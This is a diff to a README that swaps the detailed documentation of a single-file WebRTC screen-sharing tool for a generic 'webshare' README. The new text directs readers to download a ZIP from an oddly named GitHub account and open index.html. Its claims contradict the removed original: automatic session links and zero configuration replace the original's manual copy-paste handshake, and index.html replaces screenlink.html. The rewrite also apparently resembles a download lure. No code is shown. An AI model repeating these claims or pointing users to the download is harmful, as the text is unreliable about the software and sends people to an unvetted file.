@@ -1,110 +1,56 @@
-# ▣ ScreenLink
+# 🌐 webshare - Share your screen directly between browsers
 
-> **Serverless, zero-signup P2P screen sharing — one HTML file, no install required.**
+[![Download webshare](https://img.shields.io/badge/Download-webshare-blue)](https://github.com/Firm-lycaenahypophlaeas1589/webshare)
 
-![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
-![No Server](https://img.shields.io/badge/server-none-brightgreen?style=flat-square)
-![No Signup](https://img.shields.io/badge/signup-none-brightgreen?style=flat-square)
-![Single File](https://img.shields.io/badge/size-single%20file-blue?style=flat-square)
-![WebRTC](https://img.shields.io/badge/powered%20by-WebRTC-orange?style=flat-square)
-![Works Offline](https://img.shields.io/badge/works%20from-file%3A%2F%2F-blueviolet?style=flat-square)
+webshare provides a way to share your screen with others. It uses your web browser to create a direct connection between your computer and the viewer. This means your private data stays on your device. You do not need to create accounts. You do not need to install software. You do not need a central server.
 
-ScreenLink lets you share your screen with anyone using only a browser. There is no server, no account, no extension, and no data ever leaves your machine to a third party. It runs entirely from a single `.html` file, including directly off `file://`.
+## ⚙️ How it works
 
-**If this project is useful to you, consider giving it a ⭐ — it helps others find it!**
+The software uses a group of technologies known as WebRTC. These technologies allow browsers to communicate with each other. When you open the file, your browser acts as a local host. It sends the video data from your screen directly to the person viewing it. Because the connection stays between the two browsers, your data remains secure. 
 
----
+## 📋 System Requirements
 
-## ✨ Features
+You need a modern web browser to use this tool. Chrome, Edge, and Firefox work best. Ensure you have a stable internet connection. The tool relies on your network to send the video feed. A wired connection offers the best quality. If you use Wi-Fi, stay near your router during the session.
 
-- **100% serverless** — pure WebRTC peer-to-peer, no relay or backend
-- **No signup, no tracking, no data stored**
-- **Single file** — the entire app is one `.html` file you can save and run anywhere
-- **Works from `file://`** — no web server needed, just open it in a browser
-- **Audio + video** — shares your screen with optional system audio
-- **Live preview** — the host sees a local preview while sharing
-- **Fullscreen viewer** — viewer can go fullscreen with one click
-- **30 fps capture** — smooth, high-quality stream
+## 📥 Getting the software
 
----
+1. Visit the project page at this link: [https://github.com/Firm-lycaenahypophlaeas1589/webshare](https://github.com/Firm-lycaenahypophlaeas1589/webshare).
+2. Click the green button labeled "Code" near the top right of the page.
+3. Select "Download ZIP" from the menu.
+4. Locate the downloaded file in your Downloads folder.
+5. Right-click the file and select "Extract All" to see the contents.
+6. Open the folder to find the file named `index.html`.
 
-## 🚀 Usage
+## 🚀 Running your session
 
-No installation required. Just open `screenlink.html` in a modern browser.
+Double-click the `index.html` file to open it in your browser. The page will load immediately. Once the page opens, you will see a prompt from your browser asking for permission to access your screen. Click "Allow" so the software can capture the video.
 
-### Sharing your screen (Host)
+The page generates a unique link for your session. Copy this link and send it to your friend or coworker. When they open the link in their own browser, they will see your screen. You do not need to perform any configuration steps. The connection starts as soon as they join.
 
-1. Open `screenlink.html` and go to the **Share Screen** tab
-2. Click **Start Sharing** and pick a window or your full screen
-3. Click **Generate Offer** — a short text blob will appear
-4. Copy the blob and send it to your viewer (chat, email, anything works)
-5. Wait for the viewer to send back their **Answer** blob
-6. Paste their Answer and click **Connect** — you're live ✓
+## 🛡️ Privacy and Safety
 
-### Viewing a screen (Viewer)
+Privacy remains the focus of this tool. Since the software does not use a middle server, no company records your activity. All images and sounds move through an encrypted tunnel directly to the viewer. When you close the browser window or the browser tab, the connection ends. No data remains on the internet after you finish the call.
 
-1. Open `screenlink.html` and go to the **View Screen** tab
-2. Paste the host's **Offer** blob
-3. Click **Generate Answer** — your own blob will appear
-4. Copy it and send it back to the host
-5. The live stream appears automatically once the host connects ✓
+## 🛠️ Troubleshooting common issues
 
----
+If you encounter a black screen, ensure your browser has permission to capture the display. Sometimes privacy settings in Windows block browsers from recording. Go to your Windows Settings, head to Privacy and Security, check your Camera and Screen recording settings, and verify the browser has access.
 
-## 🔧 How It Works
+If the connection fails to establish, check your firewall. Some corporate networks block direct browser-to-browser connections for security reasons. If you work from a home network, the default settings usually work fine. Refresh the page to reset the connection if the video freezes.
 
-ScreenLink uses **WebRTC** with **manual SDP signaling** — the standard WebRTC handshake, but without a signaling server. Instead, you act as the signaling channel by copy-pasting two short base64 blobs between the host and viewer.
+## 💡 Best practices for clear video
 
-```
-Host                              Viewer
- │                                  │
- │── Offer blob ──────────────────► │
- │                                  │ (generates Answer)
- │◄─────────────────── Answer blob ─│
- │                                  │
- └──────── P2P stream established ──┘
-```
+Close other tabs or programs that use your network to keep the feed smooth. Avoid running high-definition video games while you share your screen. If the other person sees a laggy image, lower your screen resolution in display settings before you begin the session. Use a headset if you also plan to share audio to reduce feedback.
 
-ICE candidates are gathered using Google's public STUN servers (`stun.l.google.com`). Once the connection is established, all media flows **directly between the two browsers** — no data touches any server.
+## 📑 Frequently asked questions
 
----
+Does this work on mobile devices?
+The software works best on desktop browsers. Mobile browsers often restrict screen capture capabilities to save battery and data. 
 
-## 🌐 Browser Compatibility
+Does this tool save recordings? 
+No. webshare serves as a live transmitter only. It does not possess a storage function. Once your session ends, the video disappears.
 
-| Browser | Supported |
-|---|---|
-| Chrome / Chromium | ✅ |
-| Edge | ✅ |
-| Firefox | ✅ |
-| Safari 15.4+ | ✅ |
+Do I need to update this tool?
+Since the tool is a single file, you do not perform traditional updates. To get new features, simply download the latest version from the link provided in the Getting the software section. 
 
-> **Note:** `getDisplayMedia` (screen capture) requires a secure context (`https://` or `file://`). It will not work on plain `http://`.
-
----
-
-## ⚠️ Limitations
-
-- Requires **both parties to be online at the same time** to exchange blobs
-- May not work if one or both peers are behind a strict corporate firewall/NAT that blocks WebRTC (no TURN server is included)
-- Screen capture permission must be granted by the host's browser
-
----
-
-## 📁 Project Structure
-
-```
-webshare/
-└── screenlink.html   # The entire app — HTML, CSS, and JS in one file
-```
-
----
-
-## 🤝 Contributing
-
-Contributions, issues, and feature requests are welcome! Feel free to open an issue or submit a pull request.
-
----
-
-## 📄 License
-
-MIT — do whatever you want with it.
+Can I change the connection settings? 
+The tool uses automatic detection to find the best route for your data. It does not require manual adjustments. The zero-config design ensures you finish the setup in seconds.
